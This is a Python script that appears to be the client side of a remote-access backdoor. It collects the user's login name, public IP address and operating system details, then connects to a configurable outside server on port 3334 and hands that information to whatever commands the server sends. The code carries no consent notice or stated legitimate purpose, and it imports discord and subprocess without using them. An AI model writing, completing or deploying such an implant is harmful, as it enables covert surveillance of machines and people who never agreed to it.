import os
import requests
import json
import platform
import discord
from discord.ext import commands
import socket
import getpass
import subprocess


in_socket = socket.socket(socket.AF_INET)

user = getpass.getuser()

user_ip = requests.get("https://icanhazip.com").text

theOs     =    platform.system()
theOsVer  =    platform.version()
theOsSt   =    theOs + " " + theOsVer


SERVER_IP    =  ""
SERVER_PORT  =  3334


def connect_to_server(ip, port):
    try: 
        int(port) 
    except TypeError:
        print(f"Port should be int not {type(port)}")
        os._exit(1)
    
    try:
      in_socket.connect((ip, port))
    except ConnectionRefusedError:
      print("Server has refused connection")
    except OSError:
      print("Invalid connection")
    

    while True:
        cmd = in_socket.recv(1024).decode("UTF-8")

        if cmd == "TEST":
            in_socket.send(bytes("CONNECTED", "UTF-8"))
        if cmd == "user":
            in_socket.send(bytes(f"Username {user}", "UTF-8"))
        if cmd == "ip":
            in_socket.send(bytes(f"IP {user_ip}", "UTF-8"))
        if cmd == "osIn":
            in_socket.send(bytes(f"Platform {theOsSt}", "UTF-8"))
        if cmd == "check":
            in_socket.send(bytes("checked", "UTF-8"))
        if cmd == "close":
            in_socket.close()
            break
            


if __name__ == "__main__":
    connect_to_server(SERVER_IP, SERVER_PORT)
